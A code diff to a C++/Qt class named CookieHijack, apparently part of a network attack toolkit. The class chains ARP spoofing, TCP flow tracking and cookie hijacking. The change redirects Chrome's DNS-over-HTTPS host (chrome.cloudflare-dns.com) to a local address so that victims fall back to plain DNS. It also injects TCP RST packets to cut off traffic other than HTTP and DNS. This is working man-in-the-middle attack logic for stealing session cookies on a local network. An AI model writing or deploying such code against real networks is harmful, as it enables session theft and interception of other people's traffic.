@@ -15,18 +15,24 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 
 	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;
 
+	dnsBlockDnsServer_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "chrome.cloudflare-dns.com", "127.4.4.4"));
+
 	bpFilter_.filter_ = "!(tcp port 80 or udp port 53)";
+
+	tcpBlockOther_.forwardBlockType_ = GTcpBlock::Rst;
+	tcpBlock_.backwardBlockType_ = GTcpBlock::Rst;
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
 	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlockDnsServer_, &GDnsBlock::block, Qt::DirectConnection);
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &tcpFlowMgr_, &GTcpFlowMgr::manage, Qt::DirectConnection);
 	QObject::connect(&tcpFlowMgr_, &GTcpFlowMgr::managed, &cookieHijack_, &GCookieHijack::hijack, Qt::DirectConnection);
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
-	QObject::connect(&bpFilter_, &GBpFilter::filtered, &block_, &GBlock::block, Qt::DirectConnection);
+	QObject::connect(&bpFilter_, &GBpFilter::filtered, &tcpBlockOther_, &GTcpBlock::block, Qt::DirectConnection);
 
 	QObject::connect(&cookieHijack_, &GCookieHijack::hijacked, &webServer_, &WebServer::doHijacked);
 
@@ -35,10 +41,11 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 	nodes_.append(&find_);
 	nodes_.append(&tcpBlock_);
 	nodes_.append(&dnsBlock_);
+	nodes_.append(&dnsBlockDnsServer_);
 	nodes_.append(&tcpFlowMgr_);
 	nodes_.append(&cookieHijack_);
 	nodes_.append(&bpFilter_);
-	nodes_.append(&block_);
+	nodes_.append(&tcpBlockOther_);
 }
 
 CookieHijack::~CookieHijack() {
